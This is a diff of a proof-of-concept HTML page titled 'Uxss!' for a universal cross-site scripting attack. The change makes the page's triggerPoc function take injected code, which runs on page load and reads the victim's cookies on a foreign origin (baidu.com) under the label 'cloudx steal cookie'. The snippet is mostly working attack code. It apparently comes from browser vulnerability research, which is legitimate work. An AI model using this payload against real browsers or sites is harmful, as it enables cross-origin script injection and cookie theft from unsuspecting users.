@@ -1,6 +1,6 @@
 <h1>Uxss!</h1>
 <script>
-  function triggerPoc(url){
+  function triggerPoc(url,code){
     const currUrl = location.href;
     const payload = `
       if(!window.__cloudx && !location.href.startsWith("${currUrl}")){
@@ -18,6 +18,6 @@
     location.href = url;
   }
   window.addEventListener('load', () => {
-    triggerPoc("https://www.baidu.com")
+    triggerPoc("https://www.baidu.com",`console.log('cloudx steal cookie:'+document.cookie)`)
   })
 </script>
